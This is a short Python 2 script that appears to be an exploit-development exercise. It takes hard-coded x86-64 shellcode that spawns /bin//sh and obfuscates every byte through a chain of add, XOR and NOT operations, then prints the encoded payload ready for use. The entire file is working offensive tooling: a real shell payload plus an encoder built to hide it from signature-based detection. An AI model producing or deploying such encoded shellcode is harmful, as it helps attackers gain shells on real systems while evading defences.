#!/usr/bin/python

# Python custom encoder 

shellcode = ("\x48\x31\xc0\x50\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x53\x48\x89\xe7\x50\x48\x89\xe2\x57\x48\x89\xe6\x48\x83\xc0\x3b\x0f\x05")
encoded = ""
encoded2 = ""

print 'Encoded shellcode ...'

for x in bytearray(shellcode) :
	x = x + 0x05 # add 5 to x
	x = x^0xBB # xor encode x with 0xBB
	x = x + 0x0A # add 10 to x
	x = x^0xCC # xor encode x with 0xCC
	x = ~x # not encode x
	x = x & 0xff # make the not encoded x positive
	x = x^0xA9 # xor encode x with 0xA9

	encoded += '\\x'
	encoded += '%02x' % x

	encoded2 += '0x'
	encoded2 += '%02x,' %x

print encoded
print encoded2
print 'Len: %d' % len(bytearray(shellcode))
